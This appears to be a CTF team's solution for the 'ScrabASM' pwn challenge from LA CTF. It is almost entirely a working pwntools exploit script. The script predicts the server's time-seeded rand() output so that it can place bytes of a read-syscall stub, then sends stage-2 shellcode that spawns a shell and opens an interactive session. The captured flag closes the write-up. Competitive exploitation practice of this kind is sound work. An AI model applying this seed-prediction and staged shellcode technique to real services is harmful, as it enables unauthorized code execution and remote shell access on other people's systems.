# pwn - ScrabASM

```
from pwn import *
import ctypes
import time

# --- Configuration ---
HOST = 'chall.lac.tf'
PORT = 31338
OFFSET_WINDOW = 120 
TRASH_INDEX = 13 

# Payload: Read 255 bytes from stdin to 0x13370000
# push rdi; pop rsi; xor edi, edi; xor eax, eax; mov dl, 0xff; syscall
# Bytes: 57 5e 31 ff 31 c0 b2 ff 0f 05
target_shellcode = b"\x57\x5e\x31\xff\x31\xc0\xb2\xff\x0f\x05"

context.arch = 'amd64'

def solve():
    # Load libc for RNG
    try:
        libc = ctypes.CDLL('libc.so.6')
    except:
        libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')

    log.info(f"Connecting to {HOST}:{PORT}...")
    p = remote(HOST, PORT)

    # 1. Capture Initial Hand
    try:
        p.recvuntil(b"Your starting tiles:\n")
        p.recvuntil(b"    ") 
        p.recvline() # border
        hex_line = p.recvline().decode().strip()
        initial_hand = [int(x, 16) for x in hex_line.replace('|', '').split()]
        log.info(f"Initial hand: {[hex(x) for x in initial_hand]}")
    except Exception as e:
        log.error(f"Failed to parse hand: {e}")
        return

    # 2. Find Seed
    now = int(time.time())
    found_seed = False
    
    log.info(f"Brute-forcing seed around {now} (+/- {OFFSET_WINDOW}s)...")

    for seed_candidate in range(now - OFFSET_WINDOW, now + OFFSET_WINDOW):
        libc.srand(seed_candidate)
        test_hand = [libc.rand() & 0xFF for _ in range(14)]
        if test_hand == initial_hand:
            log.success(f"RNG Synced! Seed: {seed_candidate}")
            found_seed = True
            break

    if not found_seed:
        log.error("Could not sync RNG. Widen the window or check libc version.")
        return

    # 3. Pre-calculate Moves
    log.info("Simulating RNG...")
    moves_buffer = b""
    local_target_map = {i: b for i, b in enumerate(target_shellcode)}
    
    while len(local_target_map) > 0:
        next_byte = libc.rand() & 0xFF
        target_idx = -1
        for idx, needed_byte in local_target_map.items():
            if next_byte == needed_byte:
                target_idx = idx
                break
        
        if target_idx != -1:
            moves_buffer += f"1\n{target_idx}\n".encode()
            del local_target_map[target_idx]
        else:
            moves_buffer += f"1\n{TRASH_INDEX}\n".encode()

    # Append the PLAY command to the very end of the buffer
    moves_buffer += b"2\n"

    log.success(f"Simulation done. Payload size: {len(moves_buffer)} bytes.")

    # 4. Execute Pipeline (Chunked)
    log.info("Sending moves...")
    
    # Send in chunks to be safe
    CHUNK_SIZE = 1024
    for i in range(0, len(moves_buffer), CHUNK_SIZE):
        p.send(moves_buffer[i:i+CHUNK_SIZE])
        time.sleep(0.05) # Tiny sleep to yield to network stack

    # 5. Send Stage 2
    # The moment the server processes the "2\n" at the end of moves_buffer,
    # it jumps to code and executes the read() syscall.
    log.info("Sending Stage 2 shellcode...")
    
    # NOP sled (10 bytes) + Shellcode
    stage2 = b"\x90" * 10 + asm(shellcraft.sh())
    
    time.sleep(1) # Give the server 1s to chew through the moves and hit the syscall
    p.send(stage2)

    p.interactive()

if __name__ == "__main__":
    solve()
```
Flage: `lactf{gg_y0u_sp3ll3d_sh3llc0d3}`

SOLVED by <@279881635267215361>

Solved by: yappare